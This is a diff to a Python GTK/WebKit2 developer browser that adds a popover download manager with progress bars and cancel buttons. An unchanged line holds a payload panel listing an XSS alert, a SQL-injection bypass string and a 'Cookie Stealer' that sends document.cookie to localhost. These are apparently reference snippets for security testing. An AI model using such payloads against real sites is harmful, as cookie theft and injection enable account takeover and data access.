@@ -6,7 +6,7 @@ import urllib.parse
 from datetime import datetime
 gi.require_version('Gtk', '3.0')
 gi.require_version('WebKit2', '4.1')
-from gi.repository import Gtk, Gdk, GLib
+from gi.repository import Gtk, Gdk, GLib, Pango
 from gi.repository import WebKit2
 
 START_PAGE_HTML = """
@@ -78,7 +78,6 @@ class ZeroDevBrowser(Gtk.Window):
         self.setup_css()
         
         self.history_store = Gtk.ListStore(str, str) 
-        self.downloads_store = Gtk.ListStore(str, str, str)
         self.bookmarks_store = Gtk.ListStore(str, str)
         self.tabs_map = {} 
         
@@ -87,8 +86,6 @@ class ZeroDevBrowser(Gtk.Window):
         
         self.main_vbox = Gtk.Box(orientation=Gtk.Orientation.VERTICAL)
         self.add(self.main_vbox)
-        
-        # GLOBAL KEYBOARD SHORTCUTS
         self.connect("key-press-event", self.on_key_press)
         
         # ================= HEADER BAR =================
@@ -124,7 +121,6 @@ class ZeroDevBrowser(Gtk.Window):
         self.search_engine_combo.append("ddg", "DuckDuckGo")
         self.search_engine_combo.append("bing", "Bing")
         self.search_engine_combo.set_active(0)
-        self.search_engine_combo.set_tooltip_text("Select Search Engine")
         center_box.pack_start(self.search_engine_combo, False, False, 0)
         
         self.url_bar = Gtk.Entry()
@@ -135,8 +131,24 @@ class ZeroDevBrowser(Gtk.Window):
         self.url_bar.set_icon_from_icon_name(Gtk.EntryIconPosition.SECONDARY, "view-refresh-symbolic")
         self.url_bar.connect("icon-press", lambda e, p, ev: self.current_webview.reload() if hasattr(self, 'current_webview') and p == Gtk.EntryIconPosition.SECONDARY else None)
         center_box.pack_start(self.url_bar, True, True, 0)
-        
         self.header.set_custom_title(center_box)
+
+        # Download Manager Popover
+        self.btn_downloads = Gtk.ToggleButton()
+        self.btn_downloads.add(Gtk.Image.new_from_icon_name("folder-download-symbolic", Gtk.IconSize.MENU))
+        self.btn_downloads.set_tooltip_text("Downloads")
+        self.header.pack_end(self.btn_downloads)
+        
+        self.downloads_popover = Gtk.Popover()
+        self.downloads_popover.set_relative_to(self.btn_downloads)
+        self.downloads_list = Gtk.ListBox()
+        self.downloads_list.set_selection_mode(Gtk.SelectionMode.NONE)
+        dl_scroll = Gtk.ScrolledWindow()
+        dl_scroll.set_size_request(350, 400)
+        dl_scroll.add(self.downloads_list)
+        self.downloads_popover.add(dl_scroll)
+        self.btn_downloads.connect("toggled", lambda b: self.downloads_popover.popup() if b.get_active() else self.downloads_popover.popdown())
+        self.downloads_popover.connect("closed", lambda p: self.btn_downloads.set_active(False))
 
         self.btn_pip = Gtk.Button()
         self.btn_pip.add(Gtk.Image.new_from_icon_name("media-playback-start-symbolic", Gtk.IconSize.MENU))
@@ -168,6 +180,7 @@ class ZeroDevBrowser(Gtk.Window):
         self.btn_newtab.connect("clicked", lambda b: self.new_tab("zero://start"))
         self.header.pack_end(self.btn_newtab)
 
+        # ================= LAYOUT =================
         self.hpaned_main = Gtk.Paned(orientation=Gtk.Orientation.HORIZONTAL)
         self.main_vbox.pack_start(self.hpaned_main, True, True, 0)
         
@@ -283,7 +296,6 @@ class ZeroDevBrowser(Gtk.Window):
         nb = Gtk.Notebook(); nb.set_tab_pos(Gtk.PositionType.BOTTOM)
         bm_tree = Gtk.TreeView(model=self.bookmarks_store); r_bm = Gtk.CellRendererText(); bm_tree.append_column(Gtk.TreeViewColumn("Title", r_bm, text=0)); bm_tree.connect("row-activated", self.on_history_activated); scroll0 = Gtk.ScrolledWindow(); scroll0.add(bm_tree); nb.append_page(scroll0, Gtk.Label(label="Bookmarks"))
         hist_tree = Gtk.TreeView(model=self.history_store); renderer = Gtk.CellRendererText(); hist_tree.append_column(Gtk.TreeViewColumn("Time", renderer, text=0)); hist_tree.append_column(Gtk.TreeViewColumn("URL", renderer, text=1)); hist_tree.connect("row-activated", self.on_history_activated); scroll1 = Gtk.ScrolledWindow(); scroll1.add(hist_tree); nb.append_page(scroll1, Gtk.Label(label="History"))
-        dl_tree = Gtk.TreeView(model=self.downloads_store); r2 = Gtk.CellRendererText(); dl_tree.append_column(Gtk.TreeViewColumn("File", r2, text=0)); dl_tree.append_column(Gtk.TreeViewColumn("Prog", r2, text=2)); scroll2 = Gtk.ScrolledWindow(); scroll2.add(dl_tree); nb.append_page(scroll2, Gtk.Label(label="Downloads"))
         plist = Gtk.ListBox()
         for title, p in [("XSS Alert", "javascript:alert(1)"), ("SQLi Bypass", "' OR '1'='1"), ("Cookie Stealer", "javascript:fetch('http://localhost/?c='+document.cookie)")]:
             row = Gtk.ListBoxRow(); v = Gtk.Box(orientation=Gtk.Orientation.VERTICAL); lt = Gtk.Label(label=title); lt.set_halign(Gtk.Align.START); lt.get_style_context().add_class("bold-label"); lp = Gtk.Label(label=p); lp.set_halign(Gtk.Align.START); lp.set_line_wrap(True); v.pack_start(lt, False, False, 2); v.pack_start(lp, False, False, 2); row.add(v); plist.add(row)
@@ -339,11 +351,53 @@ class ZeroDevBrowser(Gtk.Window):
 
     def on_download_started(self, context, download):
         filename = download.get_request().get_uri().split("/")[-1] or "downloaded_file"
-        download.set_destination("file://" + os.path.join(os.path.expanduser("~"), "Downloads", filename))
-        iter_ref = self.downloads_store.append([filename, "Downloading...", "0%"])
-        download.connect("received-data", lambda dl, l, i=iter_ref: self.downloads_store.__setitem__(i, 2, f"{int(dl.get_estimated_progress() * 100)}%"))
-        download.connect("finished", lambda dl, i=iter_ref: (self.downloads_store.__setitem__(i, 1, "Finished"), self.downloads_store.__setitem__(i, 2, "100%")))
-        download.connect("failed", lambda dl, e, i=iter_ref: self.downloads_store.__setitem__(i, 1, "Failed"))
+        dest = os.path.join(os.path.expanduser("~"), "Downloads", filename)
+        download.set_destination("file://" + dest)
+        
+        row = Gtk.ListBoxRow()
+        row.set_margin_top(5); row.set_margin_bottom(5); row.set_margin_start(10); row.set_margin_end(10)
+        vbox = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=5)
+        
+        hbox = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=10)
+        lbl_name = Gtk.Label(label=filename)
+        lbl_name.set_halign(Gtk.Align.START); lbl_name.set_ellipsize(Pango.EllipsizeMode.END)
+        lbl_status = Gtk.Label(label="Downloading...")
+        lbl_status.set_halign(Gtk.Align.END); lbl_status.get_style_context().add_class("bold-label")
+        hbox.pack_start(lbl_name, True, True, 0); hbox.pack_end(lbl_status, False, False, 0)
+        
+        pbar = Gtk.ProgressBar()
+        pbar.set_fraction(0.0)
+        
+        btn_cancel = Gtk.Button(label="Cancel")
+        btn_cancel.connect("clicked", lambda b: download.cancel())
+        
+        vbox.pack_start(hbox, False, False, 0)
+        vbox.pack_start(pbar, False, False, 0)
+        vbox.pack_start(btn_cancel, False, False, 0)
+        row.add(vbox); row.show_all()
+        
+        self.downloads_list.insert(row, 0)
+        self.btn_downloads.set_active(True)
+        self.downloads_popover.popup()
+        
+        def update_progress(dl, l):
+            frac = dl.get_estimated_progress()
+            pbar.set_fraction(frac)
+            lbl_status.set_text(f"{int(frac * 100)}%")
+            
+        def finish_dl(dl):
+            lbl_status.set_text("Finished")
+            pbar.set_fraction(1.0)
+            btn_cancel.set_label("Open Folder")
+            btn_cancel.connect("clicked", lambda b: os.system("xdg-open " + os.path.expanduser("~/Downloads")))
+            
+        def fail_dl(dl, e):
+            lbl_status.set_text("Failed/Cancelled")
+            btn_cancel.set_sensitive(False)
+
+        download.connect("received-data", update_progress)
+        download.connect("finished", finish_dl)
+        download.connect("failed", fail_dl)
 
     def build_terminal_emulator(self): box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL); self.term_output = Gtk.TextView(); self.term_output.set_editable(False); scroll = Gtk.ScrolledWindow(); scroll.add(self.term_output); box.pack_start(scroll, True, True, 0); entry = Gtk.Entry(); entry.connect("activate", self.on_term_execute); box.pack_start(entry, False, False, 0); return box
     def build_css_panel(self): box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL); self.css_text = Gtk.TextView(); scroll = Gtk.ScrolledWindow(); scroll.add(self.css_text); box.pack_start(scroll, True, True, 0); btn = Gtk.Button(label="Inject CSS to Tab"); btn.connect("clicked", self.on_inject_css); box.pack_start(btn, False, False, 0); return box
@@ -498,7 +552,6 @@ class ZeroDevBrowser(Gtk.Window):
         Gtk.StyleContext.add_provider_for_screen(Gdk.Screen.get_default(), provider, Gtk.STYLE_PROVIDER_PRIORITY_APPLICATION)
 
 if __name__ == "__main__":
-    from gi.repository import Pango
     win = ZeroDevBrowser()
     win.connect("destroy", Gtk.main_quit)
     win.show_all()
